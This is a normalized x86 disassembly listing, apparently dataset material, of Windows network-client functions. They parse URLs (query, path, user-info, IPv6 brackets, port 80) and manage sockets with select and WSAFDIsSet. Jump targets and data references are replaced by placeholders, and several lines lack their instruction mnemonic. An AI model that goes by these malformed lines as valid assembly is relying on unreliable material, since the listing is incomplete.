mov eax [ edi + 0x2b4 ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x2b8 ]
inc esi
cmp esi eax
jl r-xdata
mov ecx [ edi + 0xf4 ]
dec ecx
je r-xdata
mov edx [ esp + 0x18 ]
test ebx ebx
jl r-xdata
mov ecx [ eax + 0xb8 ]
mov eax [ eax + 0xb4 ]
push ecx
mov ecx [ eax + 0xb0 ]
mov eax [ eax + 0xac ]
push ecx
jmp r-xdata
mov ecx [ edi + 0x2b4 ]
mov edx [ ecx + ebx * 4 ]
push edx
call sub_405a70
mov eax [ edi + 0x2b4 ]
add esp 0x4
mov [ eax + ebx * 4 ] 0x0
mov [ esp + 0x10 ] eax
mov ebx esi
push eax
push edx
push ebp
call sub_40aa00
mov ecx [ esp + 0x20 ]
add esp 0x10
cmp eax ecx
jle r-xdata
sub_405cd0
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
mov al [ esi + 0x111 ]
test al al
je r-xdata
mov eax [ esi ]
push 0x2
push eax
call sub_40ab10
mov eax [ esi + 0x120 ]
add esp 0x8
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax edi
pop edi
pop esi
retn
call sub_40a9a0
mov [ esi + 0xac ] eax
push esi
mov [ esi + 0xb0 ] edx
call [ esi + 0x120 ]
add esp 0x4
mov edi eax
sub_405d20
mov ecx [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push ebx
push eax
push edi
push ecx
mov [ ebx ] 0x0
call sub_405d90
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push eax
call sub_405a70
add esp 0x4
mov [ edi ] 0x0
mov edx [ edi ]
push eax
push edx
call sub_406a90
mov esi eax
add esp 0x8
test esi esi
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
sub_405d90
sub esp 0x23c
mov al [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x24 ] al
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x25 ]
mov edx [ esp + 0x25c ]
[ edi ]
mov ecx [ esp + 0x258 ]
mov ebp [ esp + 0x250 ]
stosw [ edi ]
mov [ ecx ] 0x0
mov [ edx ] 0x0
stosb [ edi ]
mov eax [ ebp + 0x190 ]
mov [ esp + 0x18 ] 0x0
test eax eax
jne r-xdata
push 0x750
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x3
pop ebx
add esp 0x23c
retn
mov ecx [ esp + 0x254 ]
xor eax eax
mov edi esi
or ebx 0xffffffff
mov [ ecx ] esi
mov ecx 0x1d4
[ edi ]
mov [ esi ] ebp
mov [ esi + 0xbc ] ebx
mov [ esi + 0xc0 ] ebx
mov [ esi + 0x4 ] ebx
mov eax [ ebp + 0x198 ]
test eax eax
je r-xdata
mov eax [ esp + 0x254 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x23c
retn
xor eax eax
cmp [ eax ] 0x0
je r-xdata
mov ebx [ malloc@IAT ]
push edi
call ebx
add esp 0x4
mov [ esi + 0x68 ] eax
test eax eax
jne r-xdata
mov edi 0x100
mov eax [ ebp + 0x13c ]
test eax eax
jne r-xdata
push edi
mov [ esi + 0x6c ] eax
call ebx
add esp 0x4
mov [ esi + 0x60 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x23c
retn
mov eax 0x1
jmp r-xdata
mov edi [ sscanf@IAT ]
mov [ esi + 0x64 ] eax
mov eax [ esi + 0x6c ]
mov ecx [ ebp + 0x190 ]
lea ebx [ esi + 0x20 ]
push eax
push ebx
push rw-data
push ecx
call edi
add esp 0x10
cmp eax 0x2
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x23c
retn
mov [ esi + 0xc8 ] ebx
mov [ esi + 0x107 ] al
mov [ esi + 0x104 ] 0x1
mov [ esi + 0xcc ] ebx
call sub_40a9a0
mov [ esi + 0xb4 ] eax
mov [ esi + 0xb8 ] edx
mov edx [ ebp + 0x40 ]
test edx edx
setne dl
mov [ esi + 0x10b ] dl
mov eax [ ebp + 0x40 ]
mov [ esi + 0x88 ] eax
mov ecx [ ebp + 0xa8 ]
mov eax [ esi ]
mov [ esi + 0x90 ] ecx
mov edx [ ebp + 0xac ]
mov ecx [ esi + 0xb4 ]
mov [ esi + 0x94 ] edx
mov [ eax + 0x230 ] ecx
mov edx [ esi + 0xb8 ]
mov [ eax + 0x234 ] edx
mov ecx [ ebp + 0x34 ]
test ecx ecx
setne al
mov [ esi + 0x108 ] al
mov eax [ ebp + 0x14 ]
test eax eax
setne cl
mov [ esi + 0x109 ] cl
mov dl [ ebp + 0x16e ]
mov [ esi + 0x113 ] dl
mov edi [ ebp + 0x190 ]
mov ecx ebx
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
cmp edi 0x100
jge r-xdata
mov eax [ esi + 0x60 ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov edx [ rw-data ]
mov [ eax + 0x4 ] edx
mov ecx [ rw-data ]
mov [ eax + 0x8 ] ecx
mov dl [ rw-data ]
mov [ eax + 0xc ] dl
mov eax [ esi + 0x6c ]
mov cx [ rw-data ]
mov [ eax ] cx
mov edx [ esi + 0x6c ]
mov eax [ esi + 0x60 ]
mov ecx [ ebp + 0x190 ]
push edx
push eax
push ebx
push rw-data
push ecx
call edi
add esp 0x14
cmp eax 0x2
jge r-xdata
push rw-data
push ebx
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi + 0x6c ]
cmp [ edx ] 0x3f
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ esi + 0x60 ]
mov ecx [ ebp + 0x190 ]
push edx
push eax
push rw-data
push ecx
call edi
add esp 0x10
cmp eax 0x1
jge r-xdata
mov edx [ esi + 0x6c ]
cmp [ edx ] 0x2f
jne r-xdata
test [ esi + 0x8 ] 0x1
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push edx
inc edx
push edx
call [ memmove@IAT ]
mov eax [ esi + 0x6c ]
add esp 0xc
mov [ eax ] 0x2f
mov edx [ esi + 0x60 ]
push 0x6
push edx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x3
pop ebx
add esp 0x23c
retn
mov eax [ esi + 0x6c ]
cmp [ eax ] 0x2f
je r-xdata
cmp [ edx + 0x1 ] 0x2f
jne r-xdata
mov eax [ esi + 0x90 ]
mov ecx [ esi + 0x94 ]
mov edx eax
or edx ecx
je r-xdata
mov ecx [ ebp + 0x190 ]
push ecx
push ebx
push rw-data
call sub_40a280
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esi + 0x60 ]
push 0x3
push edx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax ebx
mov [ eax ] ecx
mov dx [ rw-data ]
mov [ eax + 0x4 ] dx
mov cl [ rw-data ]
mov [ eax + 0x6 ] cl
jmp r-xdata
mov ecx [ rw-data ]
lea ebx [ esi + 0x20 ]
mov eax ebx
mov [ eax ] ecx
mov dl [ rw-data ]
mov [ eax + 0x4 ] dl
jmp r-xdata
push 0x2f
push eax
call [ strchr@IAT ]
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea ebx [ edx + 0x2 ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
not ecx
push ecx
push ebx
push edx
call [ memmove@IAT ]
add esp 0xc
push rw-data
push ebx
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
mov dl [ esi + 0x10b ]
test dl dl
jne r-xdata
mov [ ebp + 0x190 ] eax
mov [ ebp + 0x194 ] 0x1
mov eax [ esi + 0x8 ]
and al 0xfe
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x23c
retn
mov ecx [ esi + 0x60 ]
push 0x6
push ecx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
or al 0x1
mov [ esi + 0x8 ] eax
mov al [ edx + 0x1 ]
test al al
je r-xdata
push rw-data
push ebx
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp + 0x30 ]
test eax eax
je r-xdata
push ecx
push eax
push rw-data
lea eax [ esp + 0x30 ]
push 0x28
push eax
call sub_40a260
lea ecx [ esp + 0x38 ]
push ecx
call [ _strdup@IAT ]
add esp 0x18
mov [ esi + 0x88 ] eax
mov [ esi + 0x10c ] 0x1
mov [ esi + 0x10b ] 0x1
mov ecx [ esi + 0x60 ]
push 0x4
push ecx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edx ebx
mov [ edx ] eax
mov cx [ rw-data ]
mov [ edx + 0x4 ] cx
mov al [ rw-data ]
mov [ edx + 0x6 ] al
jmp r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push edx
mov edx [ esi + 0x6c ]
push edx
call [ memmove@IAT ]
add esp 0xc
cmp al 0x2f
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x23c
retn
mov ebx [ esi + 0x8 ]
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0xffffffff
push 0xffffffff
or bh 0x1
push 0xffffffff
push esi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x111 ] 0x1
call sub_408c60
add esp 0x20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x23c
retn
mov eax 0x50
mov cl [ ebp + 0x82e5 ]
test cl cl
jne r-xdata
mov edx [ esi + 0x60 ]
push 0x4
push edx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov edx ebx
mov [ edx ] eax
mov cl [ rw-data ]
mov [ edx + 0x4 ] cl
jmp r-xdata
inc edx
mov ecx [ esi + 0x64 ]
push 0x3a
push ecx
call [ strrchr@IAT ]
add esp 0x8
mov edi eax
cmp [ esp + 0x13 ] 0x5d
jne r-xdata
mov ecx [ esi + 0x8 ]
lea edx [ esp + 0x13 ]
mov [ esi + 0x70 ] eax
mov eax [ esi + 0x64 ]
push edx
or ecx 0x4
push rw-data
push eax
mov [ esi + 0x74 ] 0x50
mov [ esi + 0x8 ] ecx
mov [ esi + 0x114 ] sub_40b700
mov [ esi + 0x11c ] 0x0
mov [ esi + 0x118 ] sub_40b620
mov [ esi + 0x120 ] sub_40b5d0
call [ sscanf@IAT ]
add esp 0xc
cmp eax 0x1
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
mov dl [ rw-data ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov dl [ rw-data ]
jmp r-xdata
mov eax [ ebp + 0x198 ]
mov ebx [ free@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x1c ]
lea ebx [ edi + 0x1 ]
push 0xa
push edx
push ebx
call [ strtoul@IAT ]
mov ecx [ esp + 0x28 ]
add esp 0xc
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x64 ]
push 0x5d
inc eax
mov [ esi + 0x10a ] 0x1
push eax
mov [ esi + 0x64 ] eax
call [ strchr@IAT ]
mov edi eax
add esp 0x8
mov [ edi ] 0x0
mov al [ edi + 0x1 ]
inc edi
cmp al 0x3a
jne r-xdata
mov [ eax + 0x4 ] dl
mov edi [ _strdup@IAT ]
mov [ esp + 0x14c ] 0x0
mov [ esp + 0x4c ] 0x0
mov al [ esi + 0x8 ]
test al 0x14
je r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
mov eax [ esi + 0x64 ]
push 0x40
push eax
call [ strchr@IAT ]
mov ecx [ esi + 0x64 ]
add esp 0x8
test eax eax
je r-xdata
push eax
call [ _strdup@IAT ]
mov edi eax
add esp 0x4
test edi edi
mov ebx edi
jne r-xdata
cmp eax 0xffff
jbe r-xdata
test edi edi
je r-xdata
test [ esi + 0x8 ] 0x10
je r-xdata
lea ecx [ esp + 0x4c ]
lea edx [ esp + 0x14c ]
push ecx
push edx
push rw-data
push eax
call [ sscanf@IAT ]
add esp 0x10
inc eax
mov [ esi + 0x64 ] eax
mov eax [ ebp + 0x174 ]
cmp eax 0x2
je r-xdata
push rw-data
push edi
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x23c
retn
mov [ edi ] 0x0
mov [ esi + 0x74 ] ax
pop edi
pop esi
pop ebp
mov eax 0x3
pop ebx
add esp 0x23c
retn
lea eax [ esp + 0x14c ]
push eax
call edi
lea ecx [ esp + 0x50 ]
mov [ esi + 0x9c ] eax
push ecx
mov al [ esi + 0x108 ]
test al al
jne r-xdata
mov [ esi + 0x108 ] 0x1
mov al [ ecx ]
lea edx [ esp + 0x4c ]
cmp al 0x3a
push edx
je r-xdata
push 0x3a
push ebx
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea ebx [ eax + 0x3 ]
lea edx [ esp + 0x20 ]
push edx
push esi
push ebp
call sub_406870
add esp 0xc
test al al
je r-xdata
mov al [ ebp + 0x82d0 ]
test al al
je r-xdata
push rw-data
call edi
mov [ esi + 0x9c ] eax
push rw-data
jmp r-xdata
push rw-data
push ecx
call [ sscanf@IAT ]
add esp 0xc
lea eax [ esp + 0x150 ]
push eax
push rw-data
push ecx
call [ sscanf@IAT ]
add esp 0x10
jmp r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
push eax
call [ atoi@IAT ]
add esp 0x4
jmp r-xdata
push esi
push ebp
call sub_406a40
add esp 0x8
mov edi esi
mov esi [ esi + 0x98 ]
test esi esi
je r-xdata
call edi
mov [ esi + 0xa0 ] eax
mov al [ ebp + 0x17f ]
add esp 0x8
test al al
je r-xdata
push ebx
call [ _strdup@IAT ]
push edi
mov [ esi + 0x98 ] eax
call [ free@IAT ]
mov ebx [ free@IAT ]
add esp 0x8
mov [ esi + 0x70 ] eax
xor eax eax
mov al [ ebp + 0x170 ]
test al al
je r-xdata
mov esi [ esp + 0x20 ]
mov al [ edi + 0x108 ]
mov [ esi + 0x108 ] al
mov cl [ edi + 0x109 ]
mov eax [ esi + 0x60 ]
mov [ esi + 0x109 ] cl
mov dl [ edi + 0x113 ]
push eax
mov [ esi + 0x113 ] dl
call ebx
mov ecx [ edi + 0x60 ]
mov eax [ esi + 0x68 ]
mov [ esi + 0x60 ] ecx
mov edx [ edi + 0x64 ]
push eax
mov [ esi + 0x64 ] edx
call ebx
mov ecx [ edi + 0x68 ]
or eax 0xffffffff
mov [ esi + 0x68 ] ecx
mov edx [ edi + 0x6c ]
mov [ esi + 0xc8 ] eax
mov [ esi + 0x6c ] edx
mov [ esi + 0x105 ] 0x1
mov [ esi + 0x106 ] 0x0
mov [ esi + 0xcc ] eax
mov eax [ edi + 0x9c ]
push eax
call sub_405760
mov ecx [ edi + 0xa0 ]
push ecx
call sub_405760
mov edx [ edi + 0xa4 ]
push edx
call sub_405760
mov eax [ edi + 0xa8 ]
push eax
call sub_405760
mov al [ edi + 0x10c ]
add esp 0x18
test al al
je r-xdata
push esi
call ebx
add esp 0x4
mov ebp [ ebp + 0x198 ]
test ebp ebp
je r-xdata
mov edx [ esp + 0x258 ]
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esi + 0xc ] eax
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ edx ] eax
mov eax [ esp + 0x10 ]
pop ebp
pop ebx
add esp 0x23c
retn
mov eax [ ebp + 0x98 ]
mov edx [ ebp + 0x9c ]
and eax edx
cmp eax 0xffffffff
jne r-xdata
push edi
call ebx
mov edx [ ebp + 0xa8 ]
add esp 0x4
mov [ esi + 0x90 ] edx
mov eax [ ebp + 0xac ]
mov [ esi + 0x94 ] eax
mov eax [ esi + 0x90 ]
mov ecx [ esi + 0x94 ]
mov edx eax
or edx ecx
je r-xdata
mov ecx [ edi + 0x88 ]
push ecx
call ebx
add esp 0x4
xor eax eax
lea edx [ esp + 0x14 ]
mov ax [ esi + 0x74 ]
push edx
mov [ esi + 0x70 ] eax
push eax
mov eax [ esi + 0x64 ]
push eax
push esi
call sub_404dd0
add esp 0x10
cmp eax 0x1
jne r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov ecx [ ebp + 0x100 ]
mov eax 0x1
cmp ecx eax
jne r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
push ecx
push eax
push rw-data
lea eax [ esp + 0x30 ]
push 0x28
push eax
call sub_40a260
mov al [ esi + 0x10c ]
add esp 0x14
cmp al 0x1
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x25c ]
mov edx [ esp + 0x258 ]
pop edi
pop esi
mov [ ecx ] al
mov eax [ esp + 0xc ]
mov [ edx ] eax
mov eax [ esp + 0x10 ]
pop ebp
pop ebx
add esp 0x23c
retn
mov edx [ esi + 0x70 ]
mov eax [ esi + 0x98 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
push eax
push esi
call sub_404dd0
add esp 0x10
cmp eax 0x1
jne r-xdata
mov [ esi + 0x10e ] al
mov al [ esi + 0x105 ]
test al al
je r-xdata
mov eax [ esp + 0x254 ]
mov [ esi + 0x10b ] 0x0
mov [ eax ] esi
jmp r-xdata
push eax
call [ _strdup@IAT ]
mov [ esi + 0x88 ] eax
mov eax [ esp + 0x258 ]
mov [ esi + 0x10c ] 0x1
mov [ esi + 0x10b ] 0x1
add esp 0x4
mov [ eax ] esi
jmp r-xdata
lea edx [ esp + 0x24 ]
push edx
call [ _strdup@IAT ]
mov [ esi + 0x88 ] eax
mov eax [ esp + 0x258 ]
mov [ esi + 0x10b ] 0x1
mov [ esi + 0x10c ] 0x1
add esp 0x4
mov [ eax ] esi
jmp r-xdata
mov ecx [ esi + 0x88 ]
push ecx
call ebx
add esp 0x4
mov edx [ esp + 0x258 ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ edx ] eax
mov eax [ esp + 0x10 ]
pop ebp
pop ebx
add esp 0x23c
retn
mov [ esp + 0x18 ] 0x6
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x25c ]
mov edx [ esp + 0x258 ]
pop edi
pop esi
mov [ ecx ] al
mov eax [ esp + 0xc ]
mov [ edx ] eax
mov eax [ esp + 0x10 ]
pop ebp
pop ebx
add esp 0x23c
retn
mov ecx [ ebp + 0x78 ]
mov al [ esi + 0x8 ]
mov [ esi + 0x618 ] ecx
mov edx [ ebp + 0x20 ]
test al 0x4
mov [ esi + 0x61c ] edx
je r-xdata
mov edx [ esp + 0x258 ]
pop edi
mov [ esp + 0x14 ] 0x5
pop esi
mov [ edx ] eax
mov eax [ esp + 0x10 ]
pop ebp
pop ebx
add esp 0x23c
retn
sub_406870
push ebx
push ebp
mov ebp [ esp + 0xc ]
xor ebx ebx
push esi
push edi
mov eax [ ebp + 0x2b8 ]
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn
mov edi [ esp + 0x18 ]
mov eax [ ebp + 0x2b8 ]
inc ebx
cmp ebx eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ esi + 0x8 ]
xor ecx eax
test ch 0x4
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x107 ]
test cl cl
je r-xdata
mov eax [ ebp + 0x2b4 ]
mov esi [ eax + ebx * 4 ]
test esi esi
je r-xdata
test ah 0x4
jne r-xdata
test ah 0x4
jne r-xdata
lea edx [ esi + 0x20 ]
lea eax [ edi + 0x20 ]
push edx
push eax
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
mov al [ esi + 0x107 ]
test al al
jne r-xdata
mov al [ esi + 0x107 ]
test al al
je r-xdata
mov ecx [ esi + 0x64 ]
mov edx [ edi + 0x64 ]
push ecx
push edx
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi + 0x98 ]
mov eax [ edi + 0x98 ]
push edx
push eax
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
mov ax [ edi + 0x74 ]
cmp ax [ esi + 0x74 ]
jne r-xdata
mov ecx [ edi + 0x70 ]
mov eax [ esi + 0x70 ]
cmp ecx eax
je r-xdata
mov eax [ edi + 0x8 ]
test al 0x10
jne r-xdata
mov eax [ esi + 0xbc ]
push eax
call sub_4069e0
add esp 0x4
test al al
je r-xdata
jmp r-xdata
mov edx [ esi + 0x9c ]
mov eax [ edi + 0x9c ]
push edx
push eax
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
test al 0x4
je r-xdata
mov edx [ esp + 0x1c ]
pop edi
mov al 0x1
mov [ edx ] esi
pop esi
pop ebp
pop ebx
retn
push esi
call sub_405a70
mov ecx [ ebp + 0x2b4 ]
add esp 0x4
mov [ ecx + ebx * 4 ] 0x0
mov ecx [ esi + 0xa0 ]
mov edx [ edi + 0xa0 ]
push ecx
push edx
call sub_40a820
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ edi ]
cmp [ ecx + 0x8300 ] 0x8
jne r-xdata
sub_4069e0
sub esp 0x10c
mov eax [ esp + 0x110 ]
lea edx [ esp ]
push ebx
xor ecx ecx
push edx
push ecx
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] ecx
push ecx
mov [ esp + 0x1c ] eax
lea ecx [ esp + 0x18 ]
inc eax
mov ebx 0x1
push ecx
push eax
mov [ esp + 0x20 ] ebx
call [ select@IAT ]
test eax eax
jne r-xdata
mov al bl
pop ebx
add esp 0x10c
retn
xor al al
pop ebx
add esp 0x10c
retn
sub_406a40
push esi
mov esi [ esp + 0x8 ]
xor eax eax
mov ecx [ esi + 0x2b8 ]
test ecx ecx
jle r-xdata
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x2b4 ]
cmp eax 0xffffffff
je r-xdata
push esi
call sub_405c10
add esp 0x4
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
pop esi
retn
mov edx [ esi + 0x2b4 ]
mov ecx [ esp + 0xc ]
mov [ edx + eax * 4 ] ecx
mov [ ecx + 0x4 ] eax
cmp [ edx ] 0x0
je r-xdata
sub_406a90
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push 0x1
mov edi [ esi ]
push edi
call sub_40ab10
mov eax [ esi + 0x8 ]
add esp 0x8
test ah 0x1
jne r-xdata
xor eax eax
xor ebx ebx
test al 0x4
jne r-xdata
cmp [ edi + 0x54 ] ebx
je r-xdata
mov eax [ edi + 0x198 ]
cmp eax ebx
je r-xdata
cmp [ edi + 0x58 ] ebx
je r-xdata
mov eax [ esi + 0x148 ]
push eax
call sub_405760
mov ecx [ edi + 0x54 ]
push ecx
push rw-data
call sub_40a280
add esp 0xc
mov [ esi + 0x148 ] eax
cmp [ eax ] bl
je r-xdata
mov eax [ esi + 0xbc ]
mov [ esi + 0x78 ] ebx
cmp eax 0xffffffff
mov [ esi + 0x7c ] ebx
mov [ esi + 0x80 ] ebx
jne r-xdata
mov edx [ esi + 0x14c ]
push edx
call sub_405760
mov eax [ edi + 0x58 ]
push eax
push rw-data
call sub_40a280
add esp 0xc
mov [ esi + 0x14c ] eax
push 0x2
push edi
call sub_40ab10
add esp 0x8
mov edi [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
push ecx
push edi
push esi
call sub_406b90
mov cl [ esp + 0x1c ]
add esp 0xc
cmp cl bl
je r-xdata
cmp eax ebx
mov [ esi + 0x111 ] bl
je r-xdata
push edi
push esi
call sub_405cd0
add esp 0x8
cmp eax ebx
jne r-xdata
call sub_40a9a0
mov [ esi + 0xac ] eax
mov [ esi + 0xb0 ] edx
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov [ esi + 0x111 ] 0x1
sub_406b90
mov eax [ esp + 0xc ]
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
push eax
mov eax [ esi + 0x70 ]
lea edx [ esi + 0xbc ]
push ecx
push edx
push eax
push edi
push esi
call sub_40a590
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
lea eax [ esi + 0x10 ]
xor ecx ecx
mov edx eax
mov [ esi + 0xc ] edi
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
mov [ esi + 0x14 ] edx
mov ecx [ edi ]
mov dx [ ecx + 0x8 ]
mov [ eax ] dx
mov ax [ esi + 0x70 ]
push eax
call [ htons@IAT ]
mov [ esi + 0x12 ] ax
sub_406c00
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x740 ]
push eax
push edi
call sub_406a90
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
retn
push edi
call sub_405a70
add esp 0x4
sub_406c30
push ebp
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ free@IAT ]
mov al [ esi + 0x10c ]
mov ebp [ esi ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
push eax
call edi
add esp 0x4
mov [ esi + 0x10c ] 0x0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi + 0x168 ] 0x0
push ebp
call sub_404d10
mov eax [ esi + 0x118 ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi ]
push eax
push ecx
call sub_405070
add esp 0x8
xor edi edi
push esi
call eax
add esp 0x4
mov edi eax
jmp r-xdata
push esi
call sub_405a70
add esp 0x4
test edi edi
jne r-xdata
mov al [ esi + 0x104 ]
test al al
je r-xdata
push esi
call sub_40aa80
mov al [ ebp + 0x17e ]
add esp 0x4
test al al
jne r-xdata
mov eax edi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_406ce0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor eax eax
mov esi [ edi ]
mov ecx [ esi + 0x114 ]
mov ebx [ esi ]
test ecx ecx
mov [ esi + 0x10d ] al
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call ecx
add esp 0x4
cmp eax 0x37
jne r-xdata
mov cl [ esi + 0x105 ]
test cl cl
je r-xdata
push esi
mov [ esi + 0x104 ] 0x1
call sub_406c30
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push edi
push ebx
call sub_405d20
add esp 0xc
test eax eax
jne r-xdata
mov al [ esp + 0x10 ]
mov esi [ edi ]
test al al
je r-xdata
push esi
call [ esi + 0x114 ]
add esp 0x4
push 0x0
push esi
call sub_405620
add esp 0x8
test eax eax
jne r-xdata
push esi
call sub_406c00
add esp 0x4
test eax eax
jne r-xdata
sub_406d70
sub esp 0x228
push ebx
push ebp
mov ebp [ esp + 0x234 ]
push esi
push edi
mov edi [ select@IAT ]
mov eax [ ebp ]
mov ebx [ ebp + 0x1f0 ]
mov esi [ ebp + 0x1ec ]
mov [ esp + 0x10 ] eax
mov al [ ebp + 0x604 ]
mov [ esp + 0x1c ] 0x0
test al 0x1
mov [ esp + 0x2c ] ebx
je r-xdata
test [ ebp + 0x604 ] 0x2
je r-xdata
test esi esi
jne r-xdata
test [ ebp + 0x604 ] 0x1
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x12c ]
push rw-data
mov [ esp + 0x38 ] eax
push 0x0
lea ecx [ esp + 0x38 ]
push 0x0
inc eax
push ecx
push eax
mov [ esp + 0x44 ] 0x1
lea esi [ esp + 0x44 ]
call edi
test [ ebp + 0x604 ] 0x2
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0x13c ]
push rw-data
lea ecx [ esp + 0x138 ]
mov [ esp + 0x13c ] eax
push ebx
push ecx
inc eax
lea edx [ esp + 0x140 ]
push ebx
push eax
mov [ esp + 0x148 ] 0x1
mov [ esp + 0x40 ] edx
call edi
mov esi [ esp + 0x10 ]
mov eax [ esp + 0x2c ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x144 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x12c ]
push esi
push edx
call __WSAFDIsSet
test eax eax
je r-xdata
mov al [ ebp + 0x1d0 ]
test al al
je r-xdata
mov eax [ ebp + 0x138 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x170 ]
mov ecx [ ebp + 0x174 ]
or eax ecx
jne r-xdata
mov edx [ ebp + 0x13c ]
push eax
push edx
call __WSAFDIsSet
test eax eax
je r-xdata
mov edx [ ebp + 0x1e0 ]
lea ecx [ esp + 0x18 ]
push ecx
push eax
mov eax [ ebp + 0x12c ]
push edx
push eax
push ebp
call sub_4041b0
add esp 0x14
test eax eax
jl r-xdata
mov eax 0x3fff
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1cc ]
mov ecx [ ebp + 0x1c8 ]
mov edx [ ebp + 0x188 ]
push eax
mov eax [ ebp + 0x184 ]
